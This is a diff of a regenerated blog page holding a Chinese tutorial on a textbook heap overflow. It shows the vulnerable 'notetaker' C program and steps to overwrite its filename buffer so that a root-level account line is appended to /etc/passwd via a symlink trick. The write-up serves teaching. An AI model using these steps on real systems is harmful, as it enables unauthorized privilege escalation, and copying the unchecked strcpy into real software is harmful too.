@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <script>
     (function(){
         if(''){
@@ -28,8 +28,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -47,7 +47,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -81,23 +81,23 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-
-
-
-  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo">
 
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1">
 
 
 
@@ -105,12 +105,12 @@
 
 
 <meta name="description" content="漏洞代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;fcntl.h&amp;gt;#in">
-<meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一个简单的堆溢出">
 <meta property="og:url" content="http://kevien.github.io/2017/10/28/堆溢出利用笔记/index.html">
-<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:site_name" content="M0rk&#39;s Blog">
 <meta property="og:description" content="漏洞代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;fcntl.h&amp;gt;#in">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://kevien.github.io/2017/10/28/堆溢出利用笔记/notetaker.png">
 <meta property="og:image" content="http://kevien.github.io/2017/10/28/堆溢出利用笔记/nulloverflow.png">
 <meta property="og:image" content="http://kevien.github.io/2017/10/28/堆溢出利用笔记/testfile.png">
@@ -147,7 +147,7 @@
 
 
 
-  <link rel="canonical" href="http://kevien.github.io/2017/10/28/堆溢出利用笔记/"/>
+  <link rel="canonical" href="http://kevien.github.io/2017/10/28/堆溢出利用笔记/">
 
 
 
@@ -156,7 +156,7 @@
   <title>一个简单的堆溢出 | M0rk's Blog</title>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
 
@@ -181,13 +181,13 @@
   <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">M0rk's Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -217,7 +217,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -227,7 +227,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -237,7 +237,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -247,7 +247,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
             
             关于
           </a>
@@ -257,7 +257,7 @@
         <li class="menu-item menu-item-sitemap">
           <a href="/sitemap.xml" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
             
             站点地图
           </a>
@@ -270,7 +270,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
             
             搜索
           </a>
@@ -291,9 +291,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -325,16 +323,16 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/10/28/堆溢出利用笔记/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M0rk">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/uploads/avatar.jpg">
     </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="M0rk's Blog">
     </span>
 
@@ -428,7 +426,7 @@
       
 
       
-        <h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line"></div><div class="line">void usage(char *prog_name, char *filename) &#123;</div><div class="line">   printf(&quot;Usage: %s &lt;data to add to %s&gt;\n&quot;, prog_name, filename);</div><div class="line">   exit(0);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line">   int userid, fd; // file descriptor</div><div class="line">   char *buffer, *datafile;</div><div class="line"></div><div class="line">   buffer = (char *) malloc(100);</div><div class="line">   datafile = (char *) malloc(20);</div><div class="line">   strcpy(datafile, &quot;/var/notes&quot;);</div><div class="line"></div><div class="line">   if(argc &lt; 2)                // If there aren&apos;t commandline arguments</div><div class="line">      usage(argv[0], datafile); // display usage message and exit</div><div class="line"></div><div class="line">   strcpy(buffer, argv[1]);  // copy into buffer</div><div class="line"></div><div class="line">   printf(&quot;[DEBUG] buffer   @ %p: \&apos;%s\&apos;\n&quot;, buffer, buffer);</div><div class="line">   printf(&quot;[DEBUG] datafile @ %p: \&apos;%s\&apos;\n&quot;, datafile, datafile);</div><div class="line"></div><div class="line"> // Opening the file</div><div class="line">   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);</div><div class="line">   if(fd == -1)</div><div class="line">      printf(&quot;in main() while opening file&quot;);</div><div class="line">   printf(&quot;[DEBUG] file descriptor is %d\n&quot;, fd);</div><div class="line"></div><div class="line">   userid = getuid(); // get the real user ID</div><div class="line"></div><div class="line">// Writing data</div><div class="line">   if(write(fd, &amp;userid, 4) == -1) // write user ID before note data</div><div class="line">      printf(&quot;in main() while writing userid to file&quot;);</div><div class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</div><div class="line"></div><div class="line">   if(write(fd, buffer, strlen(buffer)) == -1) // write note</div><div class="line">      printf(&quot;in main() while writing buffer to file&quot;);</div><div class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</div><div class="line"></div><div class="line">// Closing file</div><div class="line">   if(close(fd) == -1)</div><div class="line">      printf(&quot;in main() while closing file&quot;);</div><div class="line"></div><div class="line">   printf(&quot;Note has been saved.\n&quot;);</div><div class="line">   free(buffer);</div><div class="line">   free(datafile);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+        <h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line"></span><br><span class="line">void usage(char *prog_name, char *filename) &#123;</span><br><span class="line">   printf(&quot;Usage: %s &lt;data to add to %s&gt;\n&quot;, prog_name, filename);</span><br><span class="line">   exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">   int userid, fd; // file descriptor</span><br><span class="line">   char *buffer, *datafile;</span><br><span class="line"></span><br><span class="line">   buffer = (char *) malloc(100);</span><br><span class="line">   datafile = (char *) malloc(20);</span><br><span class="line">   strcpy(datafile, &quot;/var/notes&quot;);</span><br><span class="line"></span><br><span class="line">   if(argc &lt; 2)                // If there aren&apos;t commandline arguments</span><br><span class="line">      usage(argv[0], datafile); // display usage message and exit</span><br><span class="line"></span><br><span class="line">   strcpy(buffer, argv[1]);  // copy into buffer</span><br><span class="line"></span><br><span class="line">   printf(&quot;[DEBUG] buffer   @ %p: \&apos;%s\&apos;\n&quot;, buffer, buffer);</span><br><span class="line">   printf(&quot;[DEBUG] datafile @ %p: \&apos;%s\&apos;\n&quot;, datafile, datafile);</span><br><span class="line"></span><br><span class="line"> // Opening the file</span><br><span class="line">   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);</span><br><span class="line">   if(fd == -1)</span><br><span class="line">      printf(&quot;in main() while opening file&quot;);</span><br><span class="line">   printf(&quot;[DEBUG] file descriptor is %d\n&quot;, fd);</span><br><span class="line"></span><br><span class="line">   userid = getuid(); // get the real user ID</span><br><span class="line"></span><br><span class="line">// Writing data</span><br><span class="line">   if(write(fd, &amp;userid, 4) == -1) // write user ID before note data</span><br><span class="line">      printf(&quot;in main() while writing userid to file&quot;);</span><br><span class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</span><br><span class="line"></span><br><span class="line">   if(write(fd, buffer, strlen(buffer)) == -1) // write note</span><br><span class="line">      printf(&quot;in main() while writing buffer to file&quot;);</span><br><span class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</span><br><span class="line"></span><br><span class="line">// Closing file</span><br><span class="line">   if(close(fd) == -1)</span><br><span class="line">      printf(&quot;in main() while closing file&quot;);</span><br><span class="line"></span><br><span class="line">   printf(&quot;Note has been saved.\n&quot;);</span><br><span class="line">   free(buffer);</span><br><span class="line">   free(datafile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><ul>
 <li>这段代码程序中有两个buffer是存放在堆上面的，这个程序会接收一个参数，并将参数最终写入到/var/notes 这个文件中。<br><img src="/2017/10/28/堆溢出利用笔记/notetaker.png" alt=""></li>
 <li>如图所示我们可以计算出两个buffer地址之间的距离是0x70（即112个字节），我们知道第一个buffer是以null为结束的，当我们写入这个buffer长度为112个字节的时候，那么第二个buffer将会被写入到datafile这个buffer开始的部分。<br><img src="/2017/10/28/堆溢出利用笔记/nulloverflow.png" alt=""></li>
@@ -436,17 +434,17 @@
 <li>这次，溢出导致第一个buffer写入到了当前文件下的testfile文件中，而不再是/var/notes 这个文件中 ，可以看到当使用free释放内存的时候报错了，这个其实就类似于栈溢出覆盖了返回地址一样。<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4></li>
 <li>从上面可以看出，文件名可以控制，而且可以append到文件中。这里可能会有几种利用的方式，其中最常见的利用方式就是写文件/etc/passwd，这个文件包含了系统的所有的用户名、ID、登录的shell等信息(对这个文件操作之前请注意先备份O！)</li>
 <li>这个文件是以分号分隔开的，依次是登录名、密码、用户ID、组ID，用户名、用户的根目录以及登录的shell，其中密码处可以是x(代表加密，存放在/etc/shadow文件中)，也可以直接是加密后的密文，此外用户id为0代表用户会是root的权限，这个时候我们的目标就是在这个文件中追加一条，一个带有密文且id为0的账号。</li>
-<li>关于密码加密我们可以使用下面的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ perl -e &apos;print crypt(&quot;M0rk&quot;, &quot;AA&quot;). &quot;\n&quot;&apos;</div><div class="line">AAhmo1jgYI0HE</div></pre></td></tr></table></figure>
+<li>关于密码加密我们可以使用下面的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ perl -e &apos;print crypt(&quot;M0rk&quot;, &quot;AA&quot;). &quot;\n&quot;&apos;</span><br><span class="line">AAhmo1jgYI0HE</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p>所以我们最终想要在passwd文件中的条目大概是这个样子的<br>myroot:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash</p>
 <ul>
 <li><p>然而，这个特殊的堆溢出并不允许我们直接这么操作，因为我们必须以/etc/passwd为结束，但是这个限制我们可以使用符号链接来”绕过”,”绕过”方法如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ mkdir /tmp/etc</div><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ ln -s /bin/bash /tmp/etc/passwd</div><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ ls -l /tmp/etc/passwd</div><div class="line">lrwxrwxrwx 1 xxx xxx 9 Nov 16 20:56 /tmp/etc/passwd -&gt; /bin/bash</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ mkdir /tmp/etc</span><br><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ ln -s /bin/bash /tmp/etc/passwd</span><br><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ ls -l /tmp/etc/passwd</span><br><span class="line">lrwxrwxrwx 1 xxx xxx 9 Nov 16 20:56 /tmp/etc/passwd -&gt; /bin/bash</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>这个时候/tmp/etc/passwd指向了/bin/bash,这就意味着我们有了可登陆的shell，这个时候就变成了<br>myroot:AAhmo1jgYI0HE:0:0:me:/root:/tmp/etc/passwd</p>
 </li>
-<li>此外这里还需要计算一下me这里需要填充多长才能满足112个字节。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ echo &quot;myroot:AAhmo1jgYI0HE:0:0::/root:/tmp&quot; |wc -c</div><div class="line">37</div><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ bc</div><div class="line">bc 1.06.95</div><div class="line">Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.</div><div class="line">This is free software with ABSOLUTELY NO WARRANTY.</div><div class="line">For details type `warranty&apos;. </div><div class="line">112-37+1</div><div class="line">76</div></pre></td></tr></table></figure>
+<li>此外这里还需要计算一下me这里需要填充多长才能满足112个字节。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ echo &quot;myroot:AAhmo1jgYI0HE:0:0::/root:/tmp&quot; |wc -c</span><br><span class="line">37</span><br><span class="line">xxx@ubuntu:~/Desktop/heapoverflow$ bc</span><br><span class="line">bc 1.06.95</span><br><span class="line">Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.</span><br><span class="line">This is free software with ABSOLUTELY NO WARRANTY.</span><br><span class="line">For details type `warranty&apos;. </span><br><span class="line">112-37+1</span><br><span class="line">76</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="/2017/10/28/堆溢出利用笔记/final.png" alt=""></p>
@@ -456,10 +454,10 @@
 <li>《hacking the art of exploitation》chapter 0x340</li>
 </ul>
 </li>
-<li><a href="http://www.freebuf.com/articles/system/151407.html" target="_blank" rel="external">Dance In Heap（二）：一些堆利用的方法（上） </a></li>
-<li><a href="http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="external">堆溢出之unlink的利用</a></li>
-<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.71405f33KyLlt6&amp;articleid=315" target="_blank" rel="external">Linux堆内存管理深入分析</a></li>
-<li><a href="https://github.com/LunaM00n/LOL-Sec-Collection/tree/master/Notes/the-heap" target="_blank" rel="external">The Heap</a></li>
+<li><a href="http://www.freebuf.com/articles/system/151407.html" target="_blank" rel="noopener">Dance In Heap（二）：一些堆利用的方法（上） </a></li>
+<li><a href="http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">堆溢出之unlink的利用</a></li>
+<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.71405f33KyLlt6&amp;articleid=315" target="_blank" rel="noopener">Linux堆内存管理深入分析</a></li>
+<li><a href="https://github.com/LunaM00n/LOL-Sec-Collection/tree/master/Notes/the-heap" target="_blank" rel="noopener">The Heap</a></li>
 </ul>
 
       
@@ -497,8 +495,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/11/29/NuGet和travis实践/" rel="next" title="NuGet和travis实践">
-                <i class="fa fa-chevron-left"></i> NuGet和travis实践
+              <a href="/2017/10/22/Amazon云扩容笔记/" rel="next" title="Amazon云扩容笔记">
+                <i class="fa fa-chevron-left"></i> Amazon云扩容笔记
               </a>
             
           </div>
@@ -507,8 +505,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/10/22/Amazon云扩容笔记/" rel="prev" title="Amazon云扩容笔记">
-                Amazon云扩容笔记 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/11/29/NuGet和travis实践/" rel="prev" title="NuGet和travis实践">
+                NuGet和travis实践 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -557,7 +555,7 @@
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
@@ -567,10 +565,8 @@
       
 
       <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/uploads/avatar.jpg"
-               alt="M0rk" />
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="M0rk">
           <p class="site-author-name" itemprop="name">M0rk</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
@@ -697,7 +693,7 @@
         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
 
-<div class="copyright" >
+<div class="copyright">
   
   &copy; 
   <span itemprop="copyrightYear">2020</span>
